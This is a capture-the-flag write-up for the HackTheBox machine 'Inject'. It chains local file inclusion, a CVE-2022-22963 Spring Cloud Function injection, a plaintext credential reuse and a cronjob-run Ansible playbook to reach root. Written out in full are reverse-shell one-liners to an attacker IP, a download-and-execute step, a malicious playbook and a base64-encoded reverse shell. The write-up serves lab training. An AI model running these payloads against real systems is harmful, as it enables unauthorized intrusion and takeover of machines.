---
title: HTB - Inject
date: 2024-02-08
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, inject, nmap]
img_path: /assets/htb/fullpwn/inject
published: true
image:
    path: machine_info.png
---

## Overview

[**Inject**](https://app.hackthebox.com/machines/Inject) is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). 

**Initial foothold**:  
	By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the `Spring-Cloud-Function-Web` module susceptible to `CVE-2022-22963`. Exploiting this vulnerability grants an initial foothold as the `frank` user. 

**Lateral movement**:  
	Lateral movement is achieved by further file enumeration, which discloses a plaintext password for `phil`. 

**Privilege escalation**:  
	A cronjob running on the machine can then be exploited to execute a malicious `Ansible` playbook, ultimately obtaining a reverse shell as the `root` user.

## Information gathering

>_IppSec's [video walkthrough](https://www.youtube.com/watch?v=3VuIaUvHsTI)._

Port scanning:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.204

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
```

Tech used:

```bash
$ whatweb http://10.10.11.204:8080/
http://10.10.11.204:8080/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
```

Browser:

![](home.png){: width="70%" .normal}

![](home_version.png){: width="70%" .normal}

![](home_upload.png){: width="70%" .normal}

## Initial foothold

Directory fuzzing:

>_Fuzzing for `/indexFUZZ` did not return anything._

```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.11.204:8080/FUZZ -ac -c -recursion -recursion-depth 1 -e .aspx,.html,.php,.txt,.jsp -ic -v

[Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 29ms]
| URL | http://10.10.11.204:8080/register
    * FUZZ: register

[Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 116ms]
| URL | http://10.10.11.204:8080/blogs
    * FUZZ: blogs

[Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 72ms]
| URL | http://10.10.11.204:8080/upload
    * FUZZ: upload

[Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 316ms]
| URL | http://10.10.11.204:8080/environment
    * FUZZ: environment

[Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 205ms]
| URL | http://10.10.11.204:8080/error
    * FUZZ: error

[Status: 200, Size: 1086, Words: 137, Lines: 34, Duration: 118ms]
| URL | http://10.10.11.204:8080/release_notes
    * FUZZ: release_notes
```

>_**Sub-domain** and **Vhost** fuzzing did not return anything._

Try to upload a revshell (`revshell.sh`):

![](images_only.png){: width="70%" .normal}

`/release_notes` directory:

![](release_notes.png){: width="50%" .normal}

Uploading an image gives us an `Uploaded! View your Image` message and the path of the uploaded image: `http://10.10.11.204:8080/show_image?img=logo.jpg`:

![](uploaded_image_req.png)

Test for LFI:

```bash
$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://10.10.11.204:8080/show_image?img=FUZZ' -ac -c

...snip...
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 228, Words: 23, Lines: 10, Duration: 39ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 30ms]
../../../../../../../dev [Status: 200, Size: 4020, Words: 1, Lines: 1, Duration: 42ms]
/../../../../../../../../../../etc/shadow [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 33ms]
...snip...
```

Manually check the above findings:

![](lfi_req_passwd.png)

Two users along with `root`:
1. `frank`
2. `phil`

![](lfi_req_dev.png)

Since Tomcat is a Java web application server, we can get directory listing with LFI:

![](lfi_req_dir.png)

The `pom.xml` contains a listing of all the libs that JavaScript uses:

![](pom_xml.png)

![](pom_xml_content.png)

>Snyk Extension to scan via VS Code --> critical vuln [CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)

There is a [PoC](https://github.com/dinosn/CVE-2022-22963) available, but we will just get the info from there and exploit it manually:

```python
def scan(txt,cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    f = open(txt)
    urllist=f.readlines()

    for  url  in  urllist :
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
```

Things to note:
- Passing the payload through a specific header: `'spring.cloud.function.routing-expression':payload`
- The path to send our request to: `path = '/functionRouter'`
- The method of the request: `req=requests.post`

![](ping_test.png)

>_Make sure to have a two line break at the end!_

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.204 - - [08/Feb/2024 18:13:10] "GET / HTTP/1.1" 200 -
```

Although the above check worked, sending a reverse shell does not work:

```bash
"/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1"
# or
"bash -c '/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'"
```

Copy the payload to a file and serve it through an HTTP server:

```bash
$ echo "/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1" > index.html

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Open a listener on another tab:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

Save the payload to the target's `tmp` directory:

```bash
/usr/bin/curl 10.10.14.4:8000 -o /tmp/shell
```

![](saving_shell.png)

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.204 - - [08/Feb/2024 18:27:56] "GET / HTTP/1.1" 200 -
```

Execute the payload:

```bash
bash /tmp/shell
```

![](execute_shell.png)

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.204] 39350
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$
```

## Lateral Movement

Stabilize the shell:

```bash
frank@inject:/$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
frank@inject:/$ ^Z
[1]+  Stopped                 nc -lvnp 1337

┌──(kali㉿CSpanias)-[~]
└─$ stty raw -echo; fg
nc -lvnp 1337

frank@inject:/$ export TERM=xterm
```

Check for files in `frank`'s directory:

```bash
frank@inject:/$ find ~/ -type f 2>/dev/null
/home/frank/.bashrc
/home/frank/.m2/settings.xml
/home/frank/.cache/motd.legal-displayed
/home/frank/.profile

frank@inject:/$ cat ~/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Credentials: `phil:DocPhillovestoInject123`.

```bash
frank@inject:/$ su phil
Password:
phil@inject:/$ cat home/phil/user.txt
...snip...
```

## Privilege Escalation

>_Checks for sudo permissions, user files, and SUIDs did not return anything of interest._

Check groups:

```bash
phil@inject:/$ groups
phil staff

phil@inject:/$ find / -group staff -writable 2>/dev/null
/opt/automation/tasks
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/share/fonts
```

Use [`pspy`](https://github.com/DominicBreuker/pspy):

```bash
$ ls -l pspy64
-rwxr-xr-x 1 kali kali 3104768 Jan 22 08:24 pspy64

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Download `pspy` from target:

```bash
phil@inject:/$ cd /dev/shm
phil@inject:/dev/shm$ wget http://10.10.14.4:8000/pspy64
--2024-02-08 18:51:53--  http://10.10.14.4:8000/pspy64
Connecting to 10.10.14.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  3.67MB/s    in 0.8s

2024-02-08 18:51:53 (3.67 MB/s) - ‘pspy64’ saved [3104768/3104768]
phil@inject:/dev/shm$ chmod +x pspy64
phil@inject:/dev/shm$ ./pspy64
...snip...
2024/02/08 18:52:17 CMD: UID=0     PID=1      | /sbin/init auto automatic-ubiquity noprompt
2024/02/08 18:54:01 CMD: UID=0     PID=8452   | /bin/sh -c /usr/bin/rm -rf /var/www/WebApp/src/main/uploads/*
2024/02/08 18:54:01 CMD: UID=0     PID=8451   | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
2024/02/08 18:54:01 CMD: UID=0     PID=8450   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
2024/02/08 18:54:01 CMD: UID=0     PID=8449   | /usr/sbin/CRON -f
...snip...
```

This job is executing every `.yml` file (`*.yml`) within `/opt/automation/tasks/`, so we can create our `.yml` payload since we have write access to the directory (`w`):

```bash
phil@inject:/opt/automation$ cd /opt/automation/tasks
phil@inject:/opt/automation/tasks$ ls -ld
drwxrwxr-x 2 root staff 4096 Feb  8 18:56 .
phil@inject:/opt/automation/tasks$ cp playbook_1.yml shell.yml
phil@inject:/opt/automation/tasks$ nano shell.yml
phil@inject:/opt/automation/tasks$ cat shell.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    shell:
      cmd: bash -c 'bash -i >& /dev/tcp/10.10.14.4/9000 0>&1'
```

Open a listener and wait (the job runs every 2 minutes):

```bash
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.204] 59482
bash: cannot set terminal process group (9063): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks# cat /root/root.txt
cat /root/root.txt
...snip...
```

The cronjob we exploited:

```bash
root@inject:/opt/automation/tasks# crontab -l
crontab -l

...snip...
# m h  dom mon dow   comma
*/2 * * * * /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
...snip...
```

![](machine_pwned.png){: width="75%" .normal}

## Extra - Removing Bad Characters

>_Based on IppSec's [video walkthrough](https://youtu.be/3VuIaUvHsTI?t=868)._

Getting initial foothold without dropping a file on the target:

```bash
$ cat index.html
/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1

# encoding payload
$ echo "/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1" | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYxCg==

# removing bad characters, i.e., '=='
$ echo "/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1  " | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYxICAK
```

Test the payload:

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
```

```bash
$ echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYxICAK' | base64 -d | bash
```

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.14.4] 49422
```

Use the payload: 

```bash
"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvMTMzNyAwPiYxICAK}|{base64,-d}|{bash,-i}"
```

![](encoded_payload.png)

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.204] 48636
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$
```